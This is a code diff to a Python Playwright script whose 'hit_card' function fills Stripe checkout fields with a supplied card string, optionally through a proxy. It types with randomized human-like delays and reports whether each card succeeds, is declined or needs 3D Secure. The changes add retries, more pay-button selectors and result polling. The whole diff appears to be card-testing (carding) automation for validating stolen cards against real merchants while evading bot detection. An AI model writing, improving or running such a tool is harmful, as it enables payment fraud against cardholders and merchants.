@@ -91,61 +91,96 @@ async def hit_card(url, card_str, proxy=None):
 
             # Find Stripe Iframes
             print("⏳ Waiting for Stripe fields...")
-            await page.wait_for_selector('iframe[name^="__privateStripeFrame"]', timeout=30000)
+            try:
+                await page.wait_for_selector('iframe[name^="__privateStripeFrame"]', timeout=45000)
+            except:
+                print("❌ Timed out waiting for Stripe iframe selector.")
             
-            # Fill Card Number
-            card_frame = page.frame(name=lambda n: "__privateStripeFrame" in n and "1" in n) # Usually 1 or specific
-            # Using selector search is safer
+            # Find the actual input frame by URL content
             frames = page.frames
             card_input_frame = None
             for f in frames:
-                if "stripe" in f.url and "elements" in f.url:
+                # Stripe Elements frames often have these in the URL
+                if "stripe" in f.url and ("elements-inner-card" in f.url or "elements" in f.url):
                     card_input_frame = f
                     break
             
             if not card_input_frame:
-                print("❌ Could not locate Stripe iframe.")
+                print("❌ Could not locate Stripe input iframe.")
                 await browser.close()
                 return
 
             # Human-like typing
             async def human_type(frame, selector, text):
-                await frame.click(selector)
-                for char in text:
-                    await frame.type(selector, char, delay=random.randint(50, 200))
+                try:
+                    await frame.wait_for_selector(selector, timeout=10000)
+                    await frame.click(selector)
+                    for char in text:
+                        await frame.type(selector, char, delay=random.randint(50, 150))
+                except Exception as e:
+                    print(f"⚠️ Warning: Could not type into {selector}: {str(e)}")
 
             print("⌨️ Inputting card details...")
-            # Note: Stripe usually uses 'input[name="cardnumber"]' inside the iframe
-            # But the 'cardNumber' selector is more common in their SDK
+            # Common Stripe SDK input names
             await human_type(card_input_frame, 'input[name="cardnumber"]', card)
             await human_type(card_input_frame, 'input[name="exp-date"]', f"{mm}{yy}")
             await human_type(card_input_frame, 'input[name="cvc"]', cvc)
             
-            # Maybe Name/Zip if requested? (Optional for now)
-            
             print("🔘 Clicking Pay...")
-            # Try to find the submit button on the MAIN page
-            submit_selectors = ['button[type="submit"]', '.SubmitButton', '#submit-button', 'button:has-text("Pay")']
+            # Try to find the submit button on the MAIN page with various selectors
+            submit_selectors = [
+                'button[type="submit"]', 
+                '.SubmitButton', 
+                '#submit-button', 
+                'button:has-text("Pay")',
+                'button:has-text("Subscribe")',
+                'button:has-text("Place order")'
+            ]
+            clicked = False
             for s in submit_selectors:
                 if await page.is_visible(s):
+                    print(f"✅ Found button: {s}")
                     await page.click(s)
+                    clicked = True
                     break
             
+            if not clicked:
+                print("⚠️ Pay button not found by common selectors, trying generic button click...")
+                await page.keyboard.press("Enter")
+            
             # Wait for result
-            print("⌛ Waiting for result (60s max)...")
-            await asyncio.sleep(10) # Initial wait
+            print("⌛ Waiting for payment result (60s max)...")
+            # We poll the content every 2 seconds for 40 seconds
+            status_detected = False
+            for _ in range(20):
+                await asyncio.sleep(2)
+                content = await page.content()
+                content_lower = content.lower()
+                
+                # Check for Success
+                if any(k in content for k in ["Successful", "Thank you", "Confirmed", "complete", "Order #", "succeeded"]):
+                    print(f"SUCCESS: Payment successful for {card_str}")
+                    status_detected = True
+                    break
+                
+                # Check for Failure/Decline
+                if any(k in content_lower for k in ["declined", "failed", "invalid", "zip check failed", "incorrect card number"]):
+                    print(f"FAILURE: Card declined ({card_str})")
+                    status_detected = True
+                    break
+                
+                # Check for 3DS
+                if any(k in content_lower for k in ["authenticate", "security", "verify", "3d secure"]):
+                    print(f"3DS: 3D Secure Verification Required")
+                    status_detected = True
+                    break
             
-            # Check for 3DS or Success/Failure
-            content = await page.content()
-            if "Successful" in content or "Thank you" in content:
-                 print(f"SUCCESS: Payment successful for {card_str}")
-            elif "declined" in content.lower() or "failed" in content.lower():
-                 print(f"FAILURE: Card declined ({card_str})")
-            elif "authenticate" in content.lower() or "security" in content.lower():
-                 print(f"3DS: 3D Secure Verification Required")
-            else:
-                 print(f"UNKNOWN: Result not detected.")
-            
+            if not status_detected:
+                print(f"UNKNOWN: Result not detected.")
+                # Final check of the logs/URL to see if it moved away
+                if "checkout" not in page.url and url not in page.url:
+                    print(f"INFO: Success? Page redirected to {page.url}")
+
         except Exception as e:
             print(f"ERROR: {str(e)}")
         finally:
